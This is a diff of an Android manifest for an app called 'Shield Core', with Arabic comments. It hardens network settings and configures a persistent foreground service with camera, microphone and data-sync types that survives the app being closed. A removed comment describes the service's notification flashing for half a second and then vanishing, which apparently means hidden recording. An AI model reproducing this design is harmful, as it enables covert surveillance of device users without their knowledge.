@@ -78,6 +78,9 @@
 
     <!-- ============================================================
          التطبيق
+         ✅ تم تعطيل الاتصالات غير المشفرة (Cleartext Traffic) للأمان
+         ✅ تم ربط ملف أمان الشبكة (network_security_config.xml)
+         ✅ تم إضافة tools:replace لمنع تعارض label مع المكتبات
     ============================================================ -->
     <application
         android:allowBackup="true"
@@ -87,9 +90,11 @@
         android:label="Shield Core"
         android:supportsRtl="true"
         android:theme="@style/Theme.AppCompat.Light.NoActionBar"
-        android:usesCleartextTraffic="true"
+        android:usesCleartextTraffic="false"
+        android:networkSecurityConfig="@xml/network_security_config"
         android:requestLegacyExternalStorage="true"
         tools:ignore="GoogleAppIndexingWarning"
+        tools:replace="android:label"
         tools:targetApi="34">
 
         <!-- ====== النشاط الرئيسي ====== -->
@@ -106,11 +111,11 @@
         </activity>
 
         <!-- ============================================================
-             ✅ الخدمة الخلفية الصامتة (Foreground Service)
-             - تظهر الإشعار لمدة 0.5 ثانية ثم تختفي نهائياً
+             ✅ الخدمة الأمامية (Foreground Service)
              - stopWithTask="false" تمنع إيقاف الخدمة عند إغلاق التطبيق من القائمة
              - foregroundServiceType="dataSync|camera|microphone" مطلوب لأندرويد 14+
                لتحديد أنواع الخدمات المستخدمة (مزامنة البيانات + الكاميرا + الميكروفون)
+             - android:exported="false" تمنع الوصول من تطبيقات أخرى
         ============================================================ -->
         <service
             android:name=".ForegroundService"
